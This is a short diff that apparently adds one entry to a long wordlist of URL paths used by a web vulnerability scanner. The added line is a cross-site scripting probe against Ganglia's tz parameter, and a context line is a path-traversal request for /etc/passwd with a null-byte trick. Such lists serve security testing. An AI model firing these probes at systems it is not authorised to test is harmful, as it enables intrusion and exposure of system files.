@@ -3864,3 +3864,4 @@
 /ghost/api/content/tags/?key={{api_key}}&filter=slug:[
 /downloader.php?file=../../../../../../../../../../etc/passwd%00.jpg
 /login/
+/ganglia/?tz=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
